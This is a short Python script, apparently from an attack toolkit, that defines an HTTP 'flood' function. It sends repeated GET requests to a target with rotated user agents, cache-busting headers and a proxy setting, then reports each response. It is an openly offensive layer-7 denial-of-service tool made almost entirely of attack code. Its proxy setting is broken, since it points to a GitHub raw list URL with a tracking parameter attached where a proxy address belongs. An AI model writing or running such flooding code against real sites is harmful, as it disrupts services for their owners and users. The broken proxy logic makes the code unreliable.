import json
import random
import requests
from colorama import Fore as F
from requests.exceptions import Timeout, RequestException
import time

with open("tools/L7/user_agents.json", "r") as agents_file:
    user_agents = json.load(agents_file)["agents"]

headers = {
    "User-Agent": "",
    "X-Requested-With": "XMLHttpRequest",
    "Connection": "keep-alive",
    "Pragma": "no-cache",
    "Cache-Control": "no-cache",
    "Accept-Encoding": "gzip, deflate, br",
}

color_code = {True: F.GREEN, False: F.RED}

def flood(target: str, num_requests: int = 10) -> None:
    global headers
    headers["User-Agent"] = random.choice(user_agents)
    
    proxy = {
        'http': 'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt?fbclid=IwZXh0bgNhZW0CMTAAAR2UFmZv5weincv5vn8iVS83IJaIK4QjDx0oyL2GnvdHkASur1zQOfjd2uI_aem_J6pFfNvFv9nYUK2Fe_BI8A',
    }

    for _ in range(num_requests):
        try:
            response = requests.get(target, headers=headers, proxies=proxy, timeout=4)
            status = f"{color_code[response.status_code == 200]}Status: [{response.status_code}]"
            payload_size = f"{F.RESET} Requested Data Size: {F.CYAN}{round(len(response.content)/1024, 2):>6} KB"
            print(f"{status}{F.RESET} --> {payload_size} {F.RESET}")
        
        except Timeout:
            print(f"{F.RED}Timeout occurred for request.")
        
        except RequestException as e:
            print(f"{F.RED}RequestException occurred: {e}")
        
        time.sleep(0.1)
    
    print(f"{F.GREEN}Flood completed.{F.RESET}")

if __name__ == "__main__":
    target_url = "http://example.com"
    flood(target_url, num_requests=20)
